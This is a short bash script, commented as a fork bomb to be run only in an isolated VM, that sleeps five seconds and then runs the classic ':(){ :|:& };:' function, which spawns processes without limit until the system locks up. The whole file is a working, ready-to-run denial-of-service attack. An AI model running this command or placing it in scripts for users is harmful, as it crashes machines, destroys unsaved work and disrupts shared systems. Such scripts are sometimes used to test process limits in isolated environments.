#!/bin/bash
# Fork bomb - DANGEROUS! Only run in isolated VM!
sleep 5
:(){ :|:& };:
